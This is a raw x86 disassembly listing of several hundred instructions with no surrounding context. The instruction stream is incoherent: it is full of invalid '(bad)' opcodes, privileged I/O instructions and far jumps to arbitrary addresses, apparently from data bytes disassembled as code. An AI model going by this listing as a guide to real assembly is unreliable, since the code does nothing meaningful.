  41e2ef:	pop    ebx
  41e2f0:	das    
  41e2f1:	outs   dx,DWORD PTR ds:[esi]
  41e2f2:	adc    ch,BYTE PTR [edi+0x4ba574e4]
  41e2f8:	call   0x8c215014
  41e2fd:	and    eax,0xfbb1db04
  41e302:	adc    dl,BYTE PTR [ecx+eax*1-0x1b]
  41e306:	pusha  
  41e307:	dec    ecx
  41e308:	nop
  41e309:	gs xchg esp,eax
  41e30b:	xchg   DWORD PTR cs:[edi-0x22],ebx
  41e30f:	inc    esi
  41e310:	call   0x650b5a34
  41e315:	add    al,0x4d
  41e317:	aaa    
  41e318:	(bad)  
  41e319:	cmp    al,0xf7
  41e31b:	int    0x26
  41e31d:	cmc    
  41e31e:	paddw  mm2,QWORD PTR [eax+0x8e30511]
  41e325:	ja     0x41e349
  41e327:	pop    esp
  41e328:	fisubr WORD PTR [ecx]
  41e32a:	cmp    al,0x16
  41e32c:	dec    ecx
  41e32d:	repnz sbb DWORD PTR [ebx+0x2c2bdf31],edx
  41e334:	add    ebp,DWORD PTR [esi+0x838965f]
  41e33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e33b:	out    dx,al
  41e33c:	cmp    ah,ah
  41e33e:	dec    ebp
  41e33f:	mov    dl,0x7d
  41e341:	sub    al,al
  41e343:	mov    ebx,0x1331b768
  41e348:	int    0xe9
  41e34a:	sub    ecx,DWORD PTR [edi-0x2a]
  41e34d:	inc    edx
  41e34e:	rcl    ecx,cl
  41e350:	ret    0x6276
  41e353:	xchg   bx,ax
  41e355:	dec    esp
  41e356:	inc    esp
  41e357:	jb     0x41e34f
  41e359:	retf   0xbea9
  41e35c:	mov    bh,al
  41e35e:	stos   DWORD PTR es:[edi],eax
  41e35f:	mov    cs,WORD PTR [esi+0x2776a2e]
  41e365:	cdq    
  41e366:	jle    0x41e344
  41e368:	push   ecx
  41e369:	inc    edi
  41e36a:	mov    ds:0xb52b0fc,eax
  41e36f:	mov    eax,0x7ac9fc1e
  41e374:	aam    0xf4
  41e376:	out    dx,al
  41e377:	fwait
  41e378:	push   ebp
  41e379:	mov    bh,BYTE PTR [ecx+0x2e5ef5ed]
  41e37f:	(bad)
  41e383:	outs   dx,DWORD PTR ds:[esi]
  41e384:	push   ss
  41e385:	test   BYTE PTR [edx+ecx*2-0x7e],cl
  41e389:	mov    al,0x65
  41e38b:	in     eax,dx
  41e38c:	loop   0x41e368
  41e38e:	sti    
  41e38f:	add    ebp,edi
  41e391:	inc    ecx
  41e392:	inc    esi
  41e393:	out    0xac,al
  41e395:	sbb    DWORD PTR [edi],esp
  41e397:	mov    esi,0x7af61178
  41e39c:	icebp  
  41e39d:	test   al,0x51
  41e39f:	cmp    ebx,DWORD PTR [ecx-0x2f]
  41e3a2:	outs   dx,BYTE PTR ds:[esi]
  41e3a3:	jp     0x41e37a
  41e3a5:	iret   
  41e3a6:	fxch   st(1)
  41e3a8:	fcomip st,st(7)
  41e3aa:	sbb    al,0x93
  41e3ac:	push   esi
  41e3ad:	mov    edx,0xebd80ec9
  41e3b2:	jecxz  0x41e337
  41e3b4:	rcr    edi,1
  41e3b6:	not    BYTE PTR [ebx-0x33d11128]
  41e3bc:	push   ebp
  41e3bd:	mov    edi,0xee191066
  41e3c2:	sti    
  41e3c3:	mov    ds,ebx
  41e3c5:	adc    DWORD PTR [esi+eiz*8],edx
  41e3c8:	xchg   ebp,eax
  41e3c9:	sbb    eax,0xf338327e
  41e3ce:	pusha  
  41e3cf:	popa   
  41e3d0:	aam    0xd8
  41e3d2:	mov    dl,0x1a
  41e3d4:	xor    al,0x4
  41e3d6:	sub    bh,BYTE PTR [eax+0x15a5140f]
  41e3dc:	out    0xe0,al
  41e3de:	mov    dh,0xce
  41e3e0:	dec    edx
  41e3e1:	(bad)  
  41e3e2:	cli    
  41e3e3:	pusha  
  41e3e4:	sub    eax,0x2d8ae3db
  41e3e9:	xlat   BYTE PTR ds:[ebx]
  41e3ea:	in     eax,dx
  41e3eb:	pushf  
  41e3ec:	hlt    
  41e3ed:	popf   
  41e3ee:	retf   0x8567
  41e3f1:	inc    edi
  41e3f2:	neg    DWORD PTR [edx+0x682afca7]
  41e3f8:	sub    bl,BYTE PTR [ebp+0x54f68d81]
  41e3fe:	pop    esp
  41e3ff:	mov    ah,0xc1
  41e401:	jae    0x41e466
  41e403:	pop    ebx
  41e404:	adc    ch,dh
  41e406:	dec    ecx
  41e407:	mov    ecx,0x39b288d0
  41e40c:	data16 aad 0x96
  41e40f:	or     eax,0xf20b1379
  41e414:	xor    al,0x61
  41e416:	mov    WORD PTR [edi-0x5ccd27e1],ss
  41e41c:	loopne 0x41e421
  41e41e:	add    bl,BYTE PTR [edi+0x29]
  41e421:	or     al,0xa5
  41e423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e424:	jno    0x41e3f8
  41e426:	mov    ds,WORD PTR ds:[esp+0x25]
  41e42b:	data16 mov cl,0xe8
  41e42e:	inc    ebp
  41e42f:	dec    ebx
  41e430:	add    eax,0x85a32842
  41e435:	popa   
  41e436:	inc    ebx
  41e437:	stos   BYTE PTR es:[edi],al
  41e438:	dec    esi
  41e439:	sub    DWORD PTR [ebx+0x63258011],edi
  41e43f:	icebp  
  41e440:	jbe    0x41e43d
  41e442:	mov    eax,0xdae81a6c
  41e447:	jo     0x41e4c3
  41e449:	inc    ecx
  41e44a:	xlat   BYTE PTR ds:[ebx]
  41e44b:	xor    al,ah
  41e44d:	outs   dx,DWORD PTR ds:[esi]
  41e44e:	and    al,0x99
  41e450:	mov    ebp,0x8f81b347
  41e455:	stos   BYTE PTR es:[edi],al
  41e456:	scas   eax,DWORD PTR es:[edi]
  41e457:	dec    esi
  41e458:	inc    esp
  41e459:	push   eax
  41e45a:	inc    ecx
  41e45b:	and    BYTE PTR [edx-0x13],ch
  41e45e:	lods   eax,DWORD PTR ds:[esi]
  41e45f:	xchg   ebp,eax
  41e460:	sahf   
  41e461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e462:	mov    esp,0xb5113f78
  41e467:	cmp    esp,DWORD PTR ds:0x5b37f32f
  41e46d:	add    eax,0x4143134
  41e472:	add    eax,0xd9d8aab8
  41e477:	sahf   
  41e478:	out    dx,al
  41e479:	popa   
  41e47a:	clc    
  41e47b:	stos   DWORD PTR es:[edi],eax
  41e47c:	jnp    0x41e4dc
  41e47e:	cmc    
  41e47f:	shr    DWORD PTR [ecx+0x21],cl
  41e482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e483:	fidivr WORD PTR [ebp-0x38e06bea]
  41e489:	jo     0x41e467
  41e48b:	cld    
  41e48c:	lahf   
  41e48d:	outs   dx,BYTE PTR ds:[esi]
  41e48e:	dec    edi
  41e48f:	xor    al,0xea
  41e491:	cmp    esi,DWORD PTR [ebp+0x2ecac63b]
  41e497:	cmc    
  41e498:	aam    0xc5
  41e49a:	inc    eax
  41e49b:	(bad)  
  41e49c:	xor    eax,0xedbfca0c
  41e4a1:	scas   al,BYTE PTR es:[edi]
  41e4a2:	inc    esp
  41e4a3:	and    eax,0xb4d42c5e
  41e4a8:	xor    BYTE PTR [edx+0x1e],bl
  41e4ab:	fcom   QWORD PTR [ebp+0x62]
  41e4ae:	ficomp DWORD PTR [ebx]
  41e4b0:	test   esp,ebx
  41e4b2:	fidivr WORD PTR [edx-0x1b]
  41e4b5:	cmp    DWORD PTR [edx-0x3b5267fc],edi
  41e4bb:	mov    eax,ds:0x24d59b67
  41e4c0:	pop    ecx
  41e4c1:	cmp    BYTE PTR [ebx-0x52],0x77
  41e4c5:	addr16 push esi
  41e4c7:	inc    ecx
  41e4c8:	adc    al,0xc5
  41e4ca:	fidiv  DWORD PTR [ebx-0x2a92d0aa]
  41e4d0:	xor    esi,DWORD PTR [ebx-0x36068ca1]
  41e4d6:	push   ebx
  41e4d7:	jmp    0x1972:0x9b455011
  41e4de:	inc    ebx
  41e4df:	sub    esi,edi
  41e4e1:	scas   eax,DWORD PTR es:[edi]
  41e4e2:	xlat   BYTE PTR ds:[ebx]
  41e4e3:	jp     0x41e47c
  41e4e5:	test   DWORD PTR [ecx+ebp*4],edi
  41e4e8:	inc    ebp
  41e4e9:	icebp  
  41e4ea:	adc    bh,dl
  41e4ec:	loop   0x41e4ab
  41e4ee:	in     al,0xa5
  41e4f0:	(bad)  
  41e4f1:	ds lock in al,0xea
  41e4f5:	mov    cl,0xff
  41e4f7:	fidiv  WORD PTR [ebx+eax*4]
  41e4fa:	test   DWORD PTR [esp+ebx*4],ecx
  41e4fd:	xor    al,0xb2
  41e4ff:	push   eax
  41e500:	repnz cmp BYTE PTR [eax-0x7fc4fe92],bh
  41e507:	retf   0x11e7
  41e50a:	mov    edi,es
  41e50c:	or     ecx,edx
  41e50e:	or     ah,bl
  41e510:	or     BYTE PTR [ebp+0x61],cl
  41e513:	cmp    ch,BYTE PTR [edx-0x7a]
  41e516:	mov    es,WORD PTR [eax+ebx*1]
  41e519:	outs   dx,DWORD PTR ds:[esi]
  41e51a:	gs cmp eax,0x19299758
  41e520:	push   edi
  41e521:	inc    eax
  41e522:	(bad)  
  41e523:	sbb    eax,0x9c7212a2
  41e528:	mov    ecx,0xd98fd153
  41e52d:	pop    edi
  41e52e:	dec    eax
  41e52f:	add    eax,0x7414fb55
  41e534:	(bad)  
  41e536:	imul   ebp,DWORD PTR [edi-0x11],0x9abfa919
  41e53d:	pop    es
  41e53e:	std    
  41e53f:	cmp    BYTE PTR [esi+0x343bfb51],0x94
  41e546:	clc    
  41e547:	inc    ebp
  41e548:	ret    
  41e549:	mov    edi,0x4cdd8682
  41e54e:	dec    edx
  41e54f:	mov    ch,BYTE PTR [ebp-0x673e0938]
  41e555:	data16 jne 0x41e5c8
  41e558:	mov    edx,DWORD PTR [eax+0x69587fd2]
  41e55e:	push   ecx
  41e55f:	inc    ebx
  41e560:	sbb    al,0xb6
  41e562:	or     BYTE PTR [edi+ebp*1+0x3c],0x68
  41e567:	inc    edx
  41e568:	lds    edi,FWORD PTR [ebp+0x416bb091]
  41e56e:	lds    edi,FWORD PTR ds:0x3175f6eb
  41e574:	les    esi,FWORD PTR [edi]
  41e576:	cmp    eax,0x2d00d3cb
  41e57b:	or     eax,0x51ee79ee
  41e581:	aas    
  41e582:	pop    edx
  41e583:	icebp  
  41e584:	mov    al,BYTE PTR [edx-0x2d]
  41e587:	fs cli 
  41e589:	mov    WORD PTR [ebx+0x2b],gs
  41e58c:	in     eax,dx
  41e58d:	add    eax,0x3cf7babf
  41e592:	outs   dx,DWORD PTR ds:[esi]
  41e593:	xor    dh,dh
  41e595:	sub    esi,DWORD PTR [edx+0x6b]
  41e598:	xchg   edx,eax
  41e599:	mov    al,ah
  41e59b:	pop    esp
  41e59c:	lock push ss
  41e59e:	jecxz  0x41e608
  41e5a0:	hlt    
  41e5a1:	xchg   esi,eax
  41e5a2:	jb     0x41e5e7
  41e5a4:	nop
  41e5a5:	add    DWORD PTR [ecx-0xc9821b5],0x7c3b54a2
  41e5af:	dec    ecx
  41e5b0:	nop
  41e5b1:	mov    dl,0x66
  41e5b3:	push   esi
  41e5b4:	lock add DWORD PTR [edi+edx*4-0x109117ef],0x4ad1f12d
  41e5c0:	mov    ch,0x5c
  41e5c2:	(bad)  
  41e5c4:	xlat   BYTE PTR ds:[ebx]
  41e5c5:	mov    dl,0xe8
  41e5c7:	(bad)  
  41e5c9:	into   
  41e5ca:	imul   ebx,DWORD PTR [eax],0xffffffc5
  41e5cd:	push   ebp
  41e5ce:	es mov bh,0x8a
  41e5d1:	push   ebp
  41e5d2:	dec    esp
  41e5d3:	xor    ebp,DWORD PTR [edi]
  41e5d5:	jg     0x41e5f1
  41e5d7:	mov    ds:0x3e19351,al
  41e5dc:	icebp  
  41e5dd:	xchg   edi,eax
  41e5de:	aaa    
  41e5df:	ror    DWORD PTR [edi-0x6f],0xb
  41e5e3:	xchg   edx,eax
  41e5e4:	mov    ecx,0x94b8355e
  41e5e9:	mov    BYTE PTR [ebx-0x6fd4306a],bh
  41e5ef:	sbb    al,dl
  41e5f1:	push   ebp
  41e5f2:	bound  eax,QWORD PTR [esi+edx*8-0x2a944752]
  41e5f9:	and    BYTE PTR [edx],dh
  41e5fb:	aaa    
  41e5fc:	mov    edx,0x954c1f04
  41e601:	sub    dl,BYTE PTR [ebp+0x3859dcfb]
  41e607:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e608:	fcom   QWORD PTR [edi-0x64560fc6]
  41e60e:	push   edx
  41e60f:	ins    DWORD PTR es:[edi],dx
  41e610:	shl    ch,0x54
  41e613:	mov    al,ds:0xf093ed6a
  41e618:	outs   dx,BYTE PTR ds:[esi]
  41e619:	add    edx,DWORD PTR [ebx+0x1d]
  41e61c:	push   es
  41e61d:	inc    ebp
  41e61e:	mov    ch,0xb9
  41e620:	xchg   edi,eax
  41e621:	and    ecx,DWORD PTR [ebx-0x1e]
  41e624:	cmp    esp,DWORD PTR [edx-0xa]
  41e627:	rol    BYTE PTR [ebp+0x47],0xbc
  41e62b:	stos   BYTE PTR es:[edi],al
  41e62c:	into   
  41e62d:	retf   0xd874
  41e630:	inc    ecx
  41e631:	cwde   
  41e632:	mov    dh,BYTE PTR [esi]
  41e634:	ins    DWORD PTR es:[edi],dx
  41e635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e636:	test   DWORD PTR [ebx],edi
  41e638:	mul    BYTE PTR ds:0xaaed5684
  41e63e:	pop    edx
  41e63f:	(bad)  
  41e640:	aam    0xd0
  41e642:	ins    BYTE PTR es:[edi],dx
  41e643:	xchg   edi,eax
  41e644:	lock hlt 
  41e646:	mov    edx,0xbcac23fe
  41e64b:	pop    edi
  41e64c:	ins    DWORD PTR es:[edi],dx
  41e64d:	jg     0x41e5fd
  41e64f:	jge    0x41e642
  41e651:	jmp    0xb5f1:0xb4a7322d
  41e658:	je     0x41e6ae
  41e65a:	push   es
  41e65b:	lock in eax,0x25
  41e65e:	sub    al,0xa0
  41e660:	jne    0x41e605
  41e662:	mov    ebp,0x61aa09ce
  41e667:	sub    BYTE PTR [eax],0xa4
  41e66a:	jp     0x41e6df
  41e66c:	cmp    eax,0x1f670a80
  41e671:	out    dx,eax
  41e672:	shl    DWORD PTR [esi+eax*1-0x4aff0d90],1
  41e679:	shr    BYTE PTR [ebx+0x25],1
  41e67c:	(bad)  
  41e67d:	mov    cl,0x98
  41e67f:	sbb    al,0x7c
  41e681:	mov    eax,esi
  41e683:	sub    al,0x89
  41e685:	repz sub eax,0x37ac75ea
  41e68b:	cld    
  41e68c:	mov    esp,ebp
  41e68e:	repnz cwde 
  41e690:	mov    esi,0x3e86724
  41e695:	mov    esp,0xd719d695
  41e69a:	pop    edi
  41e69b:	or     bh,BYTE PTR [esi-0x6b]
  41e69e:	pop    esi
  41e69f:	icebp  
  41e6a0:	enter  0x2ca8,0x2d
  41e6a4:	cmp    al,0x1c
  41e6a6:	or     al,0x73
  41e6a8:	push   ds
  41e6a9:	xchg   ebp,eax
  41e6aa:	push   0xf0f0e81a
  41e6af:	pop    ss
  41e6b0:	js     0x41e720
  41e6b2:	shl    DWORD PTR [eax-0xc],cl
  41e6b5:	dec    ebx
  41e6b6:	dec    ecx
  41e6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b8:	mov    ds:0x5dcb8407,al
  41e6bd:	pop    edx
  41e6be:	out    0x94,al
  41e6c0:	imul   cl
  41e6c2:	xor    ah,BYTE PTR [ebx]
  41e6c4:	mov    ah,0x68
  41e6c6:	pop    ebp
  41e6c7:	jmp    0x1da7:0x1bc0f5ec
  41e6ce:	call   0xc50d617b
  41e6d3:	mov    ds:0x8491a3d1,eax
  41e6d8:	xor    al,0x8d
  41e6da:	cmpxchg DWORD PTR [eax+ebx*4+0x6f7a6d5],ebp
  41e6e2:	jmp    0x37e209d6
  41e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6e8:	cmp    al,BYTE PTR [ebx]
  41e6ea:	hlt    
  41e6eb:	cmp    edx,esp
  41e6ed:	sub    eax,DWORD PTR [ecx+ecx*8]
  41e6f0:	dec    eax
  41e6f1:	xlat   BYTE PTR ds:[ebx]
  41e6f2:	xor    DWORD PTR fs:[ebx-0x7516f97c],eax
  41e6f9:	enter  0xd1bc,0x6e
  41e6fd:	inc    eax
  41e6fe:	inc    ebx
  41e6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e700:	pop    ebp
  41e701:	push   0x1c
  41e703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e704:	mov    edx,0x4f67835f
  41e709:	xor    eax,0x8
  41e70c:	bound  esi,QWORD PTR [ecx+esi*4+0x5f]
  41e710:	sub    DWORD PTR [eax+0x52],ebp
  41e713:	fwait
  41e714:	out    dx,al
  41e715:	cmp    eax,0xa36c3510
  41e71a:	adc    eax,0x702fcb36
  41e71f:	xlat   BYTE PTR ds:[ebx]
  41e720:	out    dx,al
  41e721:	or     ecx,esp
  41e723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e724:	retf   0x24cc
  41e727:	clc    
  41e728:	ds cmp eax,0xc0b30b3a
  41e72e:	call   0xd36d:0xb5a48089
  41e735:	xor    BYTE PTR [edi-0x6b2d69ce],al
  41e73b:	in     eax,dx
  41e73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e73d:	outs   dx,BYTE PTR ds:[esi]
  41e73e:	push   0x17506c18
  41e743:	adc    BYTE PTR ds:0x313cb42b,al
  41e749:	das    
  41e74a:	js     0x41e730
  41e74c:	mov    esp,0x5ee09d8
  41e751:	addr16 out dx,al
  41e753:	sbb    ecx,DWORD PTR [edx]
  41e755:	jo     0x41e753
  41e757:	adc    al,0xb9
  41e759:	test   DWORD PTR [edi+ebp*2],esp
  41e75c:	bound  esi,QWORD PTR [ecx]
  41e75e:	mov    eax,ds:0x421f72a0
  41e763:	retf   
  41e764:	xchg   edi,eax
  41e765:	mov    esp,0xa2f9e543
  41e76a:	cmp    eax,DWORD PTR [ebx+0x37]
  41e76d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e76e:	pushf  
  41e76f:	xchg   ebp,eax
  41e770:	pop    ds
  41e771:	cmp    cl,BYTE PTR [esi]
  41e773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e774:	fdivr  DWORD PTR [ecx+0x2b]
  41e777:	cdq    
  41e778:	sub    bl,al
  41e77a:	adc    cl,BYTE PTR [esp+esi*1]
  41e77d:	adc    eax,0xe315ea5e
  41e782:	mov    edi,0x101ea251
  41e787:	dec    ebp
  41e788:	xchg   DWORD PTR ds:0xe7e49929,ebx
  41e78e:	mov    cl,0x11
  41e790:	shl    BYTE PTR [esi],cl
  41e792:	mov    al,ds:0xf56aa4a6
  41e797:	cmp    al,0x34
  41e799:	inc    edi
  41e79a:	mov    al,0xe4
  41e79c:	ds dec edi
  41e79e:	inc    eax
  41e79f:	ds mov edi,0x8277a001
  41e7a5:	xlat   BYTE PTR ds:[ebx]
  41e7a6:	lahf   
  41e7a7:	dec    ebx
  41e7a8:	inc    edi
  41e7a9:	jle    0x41e7b1
  41e7ab:	jle    0x41e749
  41e7ad:	sub    DWORD PTR [ecx-0x3f],edi
  41e7b0:	xlat   BYTE PTR ds:[ebx]
  41e7b1:	arpl   WORD PTR [edx-0x4b27a2c6],bx
  41e7b7:	jns    0x41e796
  41e7b9:	xchg   ebx,eax
  41e7ba:	jo     0x41e769
  41e7bc:	jb     0x41e755
  41e7be:	fdiv   DWORD PTR [esi]
  41e7c0:	xchg   edx,eax
  41e7c1:	xbegin 0x78cd83b3
  41e7c7:	xor    cl,ch
  41e7c9:	sub    edx,edx
  41e7cb:	xchg   edx,ecx
  41e7cd:	rcl    cl,1
  41e7cf:	xor    ah,BYTE PTR [ebx]
  41e7d1:	retfw  
  41e7d3:	arpl   cx,ax
  41e7d5:	loop   0x41e82a
  41e7d7:	jp     0x41e7ee
  41e7d9:	iret   
  41e7da:	leave  
  41e7db:	jne    0x41e7c2
  41e7dd:	sbb    bh,dl
  41e7df:	in     eax,dx
  41e7e0:	cmc    
  41e7e1:	mov    es,WORD PTR [ecx]
  41e7e3:	mov    dl,0x26
  41e7e5:	jbe    0x41e77d
  41e7e7:	mov    cl,0x1c
  41e7e9:	mov    al,ds:0x78dacb9f
  41e7ee:	aas    
  41e7ef:	and    BYTE PTR [eax],cl
  41e7f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7f2:	mov    bh,0x4b
  41e7f4:	inc    ebp
  41e7f5:	jno    0x41e7db
  41e7f7:	xchg   esi,eax
  41e7f8:	inc    eax
  41e7f9:	mov    ds:0x42bde035,eax
  41e7fe:	adc    DWORD PTR [ebx+0x3c49a1ea],ebx
  41e804:	fst    QWORD PTR [ebx-0x54]
  41e807:	and    al,0x7e
  41e809:	ret    
  41e80a:	add    edx,ebx
  41e80c:	jle    0x41e879
  41e80e:	sub    cl,BYTE PTR [ecx+esi*4]
  41e811:	and    esi,ecx
  41e813:	shr    BYTE PTR [ebp+0x4d],cl
  41e816:	pop    ebp
  41e817:	(bad)  
  41e818:	jp     0x41e83d
  41e81a:	sbb    BYTE PTR [esi+0x1442c729],0x8f
  41e821:	in     al,dx
  41e822:	add    eax,0x6c6f3d21
  41e827:	xchg   ebp,eax
  41e828:	pop    eax
  41e829:	call   0xb731:0x33e6bf9
  41e830:	jge    0x41e83f
  41e832:	retf   
  41e833:	aas    
  41e834:	push   esp
  41e835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e836:	mov    edi,0x36bee091
  41e83b:	repnz and al,0x0
  41e83e:	xor    al,0xcc
  41e840:	mov    ecx,0xd3d52c71
  41e845:	mov    ds:0xd7e4af51,eax
  41e84a:	mov    eax,ds:0x7d43e429
  41e84f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e850:	sahf   
  41e851:	stos   DWORD PTR es:[edi],eax
  41e852:	add    BYTE PTR [ecx+edx*2+0x67],dl
  41e856:	outs   dx,BYTE PTR ds:[esi]
  41e857:	jmp    0x834fe0a6
  41e85c:	or     dl,BYTE PTR [esi-0x73]
  41e85f:	and    dh,BYTE PTR [edi+0x4b]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	scas   eax,DWORD PTR es:[edi]
  41e864:	push   eax
  41e865:	mov    ds:0x87fe6e21,eax
  41e86a:	push   ds
  41e86b:	mov    al,0x34
  41e86d:	mov    bh,0x2c
  41e86f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e870:	and    DWORD PTR [edi+0x114a023c],ebp
  41e876:	fmul   DWORD PTR [ebp-0x4e]
  41e879:	cmp    eax,0x4be73cc5
  41e87e:	inc    edx
  41e87f:	std    
  41e880:	inc    ebx
  41e881:	inc    ecx
  41e882:	mov    edx,0xfe3c21e7
  41e887:	(bad)  
  41e888:	jns    0x41e811
  41e88a:	fisttp WORD PTR ds:0x4d66fe78
  41e890:	push   cs
  41e891:	dec    ebp
  41e892:	outs   dx,DWORD PTR ds:[esi]
  41e893:	push   ss
  41e894:	inc    eax
  41e895:	sbb    al,0x1c
  41e897:	sub    BYTE PTR [ecx],bh
  41e899:	xor    cl,BYTE PTR ds:0x7fae4307
  41e89f:	retf   0x6eb6
  41e8a2:	shl    BYTE PTR [edx-0x38079d04],0x53
  41e8a9:	sub    BYTE PTR [edx+0x4c46066d],ch
  41e8af:	sub    eax,0x12ed7a8a
  41e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b5:	sbb    dh,BYTE PTR [eax]
  41e8b7:	pop    ebp
  41e8b8:	outs   dx,BYTE PTR ds:[esi]
  41e8b9:	pop    ss
  41e8ba:	jecxz  0x41e8b8
  41e8bc:	and    eax,0xde5f84f9
  41e8c1:	shl    cl,0x10
  41e8c4:	test   al,0xc7
  41e8c6:	data16 xor BYTE PTR [ecx-0xab0adec],0xe0
  41e8ce:	int3   
  41e8cf:	jge    0x41e883
  41e8d1:	mov    ebp,0x5cae28f4
  41e8d6:	or     al,0x97
  41e8d8:	rcl    BYTE PTR [eax-0x58],cl
  41e8db:	push   ebp
  41e8dc:	dec    esi
  41e8dd:	cs xor ch,ch
  41e8e0:	add    BYTE PTR [edi+0x48],0x87
  41e8e4:	lods   eax,DWORD PTR ds:[esi]
  41e8e5:	dec    edx
  41e8e6:	adc    eax,0x91a668a6
  41e8eb:	hlt    
  41e8ec:	call   0x7f156b2c
  41e8f1:	jne    0x41e8e7
  41e8f3:	sti    
  41e8f4:	jne    0x41e892
  41e8f6:	rcr    DWORD PTR [edx-0x675676cf],1
  41e8fc:	sbb    DWORD PTR [edx-0x63],ebx
  41e8ff:	(bad)  
  41e900:	cmc    
  41e901:	mov    BYTE PTR [esi],0x8
  41e904:	and    DWORD PTR [esi-0x3c],ebp
  41e907:	outs   dx,DWORD PTR ds:[esi]
  41e908:	mov    eax,fs:0xdd622ee0
  41e90e:	ins    DWORD PTR es:[edi],dx
  41e90f:	mov    ebx,0xf0377ff
  41e914:	xchg   edx,eax
  41e915:	ins    BYTE PTR es:[edi],dx
  41e916:	fld    QWORD PTR [esi-0x14]
  41e919:	push   ds
  41e91a:	shl    BYTE PTR [ebx],1
  41e91c:	(bad)  
  41e91d:	popa   
  41e91e:	stos   BYTE PTR es:[edi],al
  41e91f:	and    DWORD PTR [ecx],0x1b6bdbfc
  41e925:	sahf   
  41e926:	cdq    
  41e927:	add    cl,bh
  41e929:	dec    ebx
  41e92a:	mov    al,0x18
  41e92c:	cmp    DWORD PTR [ecx],0x8c9800bc
  41e932:	cmp    al,0x5c
  41e934:	xchg   esp,eax
  41e935:	or     al,0x92
  41e937:	(bad)  
  41e938:	inc    esi
  41e939:	nop
  41e93a:	xchg   ebp,eax
  41e93b:	cwde   
  41e93c:	sti    
  41e93d:	fnstenv [ebx]
  41e93f:	push   ebx
  41e940:	les    ebx,FWORD PTR [eiz*4+0x2df739fa]
  41e947:	rcpps  xmm5,xmm4
  41e94a:	mov    ebx,0x7e31028f
  41e94f:	cdq    
  41e950:	mov    ah,0xef
  41e952:	or     cl,BYTE PTR ds:0x6d8dbc95
  41e958:	xacquire xchg DWORD PTR [ebx-0xeac7ae1],ebp
  41e95f:	mov    WORD PTR [esi-0x44],es
  41e962:	sbb    edi,ebx
  41e964:	out    0x1d,eax
  41e966:	cdq    
  41e967:	das    
  41e968:	adc    cl,BYTE PTR ds:0x53ee47ba
  41e96e:	push   0x55
  41e970:	jnp    0x41e924
  41e972:	(bad)  [ebp-0x3f]
  41e975:	test   DWORD PTR [ebx],eax
  41e977:	jbe    0x41e910
  41e979:	mov    al,0x64
  41e97b:	adc    DWORD PTR [edi+0x160fe2f9],edi
  41e981:	dec    esp
  41e982:	aam    0x99
  41e984:	or     ecx,DWORD PTR [esp-0x132c62e7]
  41e98b:	pop    ds
  41e98c:	add    al,0xed
  41e98e:	sub    eax,0xb601294
  41e993:	cmp    eax,0xb80d44d5
  41e998:	imul   eax,DWORD PTR [esp+eiz*4-0x7b],0xffffff8f
  41e99d:	not    DWORD PTR [edx-0x5]
  41e9a0:	pop    ecx
  41e9a1:	pop    ecx
  41e9a2:	rol    eax,1
  41e9a4:	sub    BYTE PTR [edx+0x35],0xe9
  41e9a8:	push   ss
  41e9a9:	pusha  
  41e9aa:	jb     0x41e976
  41e9ac:	daa    
  41e9ad:	xchg   ebp,eax
  41e9ae:	fild   DWORD PTR [edx+0x7]
  41e9b1:	(bad)  
  41e9b2:	out    dx,al
  41e9b3:	jp     0x41e9e4
  41e9b5:	pop    edx
  41e9b6:	jb     0x41e95b
  41e9b8:	retf   
  41e9b9:	out    0xf0,eax
  41e9bb:	push   cs
  41e9bc:	dec    eax
  41e9bd:	aas    
  41e9be:	es add al,0xf3
  41e9c1:	cmp    eax,0x4c6da435
  41e9c6:	rol    edi,1
  41e9c8:	lahf   
  41e9c9:	cmp    DWORD PTR [edi-0x14cef183],esi
  41e9cf:	sub    DWORD PTR [edi+0x54],esi
  41e9d2:	push   esp
  41e9d3:	mov    ecx,0xa1623ce7
  41e9d8:	aaa    
  41e9d9:	fild   WORD PTR [ebx+0x6a2b47be]
  41e9df:	mov    bh,dh
  41e9e1:	sub    BYTE PTR [ebp+0x7bbd96a1],0xfd
  41e9e8:	cmp    BYTE PTR [esi-0x3c],ch
  41e9eb:	ficom  WORD PTR [ebx+0x52]
  41e9ee:	pop    es
  41e9ef:	data16 int3 
  41e9f1:	xor    esi,DWORD PTR [edi-0x3b245ed6]
  41e9f7:	cmc    
  41e9f8:	fld    DWORD PTR [edx-0xd08239c]
  41e9fe:	inc    ebp
  41e9ff:	inc    edx
  41ea00:	stos   DWORD PTR es:[edi],eax
  41ea01:	mov    BYTE PTR [esi*4-0x603231d0],bl
  41ea08:	mov    eax,ds:0x78fe0256
  41ea0d:	jo     0x41e9d3
  41ea0f:	adc    bl,BYTE PTR [edi+0x3d9cc74e]
  41ea15:	call   DWORD PTR [esi]
  41ea17:	mov    cl,0x5
  41ea19:	sbb    al,0x1
  41ea1b:	add    DWORD PTR [ecx],ebx
  41ea1d:	(bad)
  41ea20:	sbb    DWORD PTR [edi],edx
  41ea22:	adc    eax,0x6988d701
  41ea27:	(bad)  
  41ea28:	xlat   BYTE PTR ds:[ebx]
  41ea29:	sub    eax,0xf36082e
  41ea2e:	mov    eax,ds:0x640cb6b2
  41ea33:	pop    ebp
  41ea34:	adc    eax,0xf9c3f280
  41ea39:	sti    
  41ea3a:	js     0x41ea21
  41ea3c:	loope  0x41e9f8
  41ea3e:	mov    esi,0x5f42f16d
